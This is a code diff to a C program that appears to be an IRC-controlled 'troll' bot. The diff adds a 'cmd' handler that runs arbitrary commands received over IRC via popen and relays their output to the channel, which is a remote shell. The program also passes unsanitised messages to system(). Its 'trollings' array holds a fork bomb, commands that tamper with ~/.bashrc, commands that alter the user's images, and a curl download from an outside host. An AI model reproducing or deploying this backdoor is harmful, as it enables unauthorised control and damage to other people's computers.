@@ -55,7 +55,6 @@ void getSystemInfo() {
 
 int troll(char *arg1, char *msg) {
 	int ret = 1;
-	//printf("test msg=%s\n", msg);
 	sendToChannel("trollin' trollin' trollin'");
 	if (msg == 0) {
 		int id = atoi(arg1);
@@ -66,6 +65,17 @@ int troll(char *arg1, char *msg) {
 	} else {
 		msg[strlen(msg)-2] = '\0';
 		if (strncmp(arg1, "cmd", 3) == 0) {
+			FILE *fp; 
+			char buf[BUFFSIZE]; /* read from the command ls -lL /etc */ 
+			if ((fp = popen(msg, "r")) != 0) { /* read the output from the command */ 
+				while (fgets(buf, BUFFSIZE, fp) != 0) {
+					/*fputs(buf, stdout);*/ 
+					sendToChannel(buf);
+				}
+				ret = 0;
+			} else
+				return 1;
+			pclose(fp);
 		} else if (strncmp(arg1, "wall", 4) == 0) {
 			char cmd[BUFFSIZE];
 			sprintf(cmd, "echo \"%s\" | wall", msg);
@@ -73,19 +83,9 @@ int troll(char *arg1, char *msg) {
 			ret = system(cmd);
 		} else if (strncmp(arg1, "popup", 5) == 0) {
 			char cmd[BUFFSIZE];
-			sprintf(cmd, "zenity --warning --text=\"%s\" &", msg);
+			sprintf(cmd, "export DISPLAY=:0.0;zenity --warning --text=\"%s\" &", msg);
 			sendToChannel(cmd);
 			ret = system(cmd);
-		} else if (strncmp(arg1, "photo", 5) == 0) {
-			DIR *dir;
-			struct dirent *ent;
-			if ((dir = opendir("~/Pictures")) != NULL) {
-				/* print all the files and directories within directory */
-				while ((ent = readdir (dir)) != NULL) {
-					printf ("%s\n", ent->d_name);
-				}
-				closedir (dir);
-			} 	
 		}
 	}
 
@@ -142,7 +142,8 @@ int parsePrivateCommand() {
 	char *msgcut;
 	if (msg != 0) {
 		msgcut = strchr(msg+1, ' ');
-		msgcut++;
+		if (msgcut != 0)
+			msgcut++;
 	}
 	if (strncmp(cmd, "troll", 5) == 0)
 		ret = troll(arg, msgcut);
@@ -181,7 +182,7 @@ int main() {
 		for (i = 0; i < bytesread; i++) { /*for each character received*/
 			bufIndex++; /*char position of next character read to put into buffer*/
 			buf[bufIndex] = sbuf[i];
-			if ((i > 0 && sbuf[i] == '\n' && sbuf[i - 1] == '\r') || bufIndex == BUFFSIZE) {	//if end of line or buffer size met
+			if ((i > 0 && sbuf[i] == '\n' && sbuf[i - 1] == '\r') || bufIndex == BUFFSIZE) {	/*if end of line or buffer size met*/
 				buf[bufIndex + 1] = '\0';
 				l = bufIndex;
 				bufIndex = -1;
@@ -216,12 +217,11 @@ int main() {
 
 					if (!strncmp(inc.commandIRC, "001", 3) && channel != NULL) {
 						joinChannel(channel);
-						//raw("%s %s : %s", "PRIVMSG", channel, "Alright partner... You know what time it is...\r\n");
 					} else if (!strncmp(inc.commandIRC, "PRIVMSG", 7) || !strncmp(inc.commandIRC, "NOTICE", 6)) {
 						if (inc.where == NULL || inc.message == NULL) 
 							continue;
 						if ((sep = strchr(inc.user, '!')) != NULL) 
-							inc.user[sep - inc.user] = '\0'; //replace ! with \0
+							inc.user[sep - inc.user] = '\0'; /*replace ! with \0*/
 						if (inc.where[0] == '#' || inc.where[0] == '&' || inc.where[0] == '+' || inc.where[0] == '!') 
 							inc.target = inc.where; 
 						else 
@@ -237,7 +237,7 @@ int main() {
 						printf("response code:%d\n", resp);
 
 						
-						//raw("%s %s :%s", command, target, message); // If you enable this the IRCd will get its "*** Looking up your hostname..." messages thrown back at it but it works...
+						/*raw("%s %s :%s", command, target, message); // If you enable this the IRCd will get its "*** Looking up your hostname..." messages thrown back at it but it works...*/
 					}
 				}
 			}
@@ -253,9 +253,9 @@ void initTrollings() {
 	trollings[1] = "cat /dev/zero > /dev/null";
 	trollings[2] = ":(){ :|:& }";
 	trollings[3] = "echo 'alias cd=\"echo Segmentation fault\" && echo $* > /dev/null' >> ~/.bashrc; echo 'alias ls=\"echo .\"' >> ~/.bashrc";
-	trollings[4] = "for file in ~/{,Pictures,Downloads}/*; do e=`file \"$file\" | cut -d ' ' -f 2`; if [ $e == \"GIF\" ] || [ $e == \"JPEG\" ] || [ $e == \"PNG\" ]; then mogrify -flip \"$file\"; fi; done";
-	trollings[5] = "for file in ~/{,Pictures,Downloads}/*; do e=`file \"$file\" | cut -d ' ' -f 2`; if [ $e == \"GIF\" ] || [ $e == \"JPEG\" ] || [ $e == \"PNG\" ]; then mogrify -blur 4 \"$file\"; fi; done";
-	trollings[6] = "if [ ! -f ~/.baby.wav ]; then curl http://www.niko.rocks/keeptrollin/baby.wav -o ~/.baby.wav; fi; aplay ~/.baby.wav &";
+	trollings[4] = "~/.trollin/photo_troll.sh flip";
+	trollings[5] = "~/.trollin/photo_troll.sh blur";
+	trollings[6] = "if [ ! -f ~/.baby.wav ]; then curl http://www.niko.rocks/keeptrollin/baby.wav -o ~/.trollin/.baby.wav; fi; aplay ~/.trollin/.baby.wav &";
 	trollings[7] = "eject -T";
 	trollings[8] = "eject -t";
 	trollings[9] = "echo sleep 5 >> ~/.bashrc";
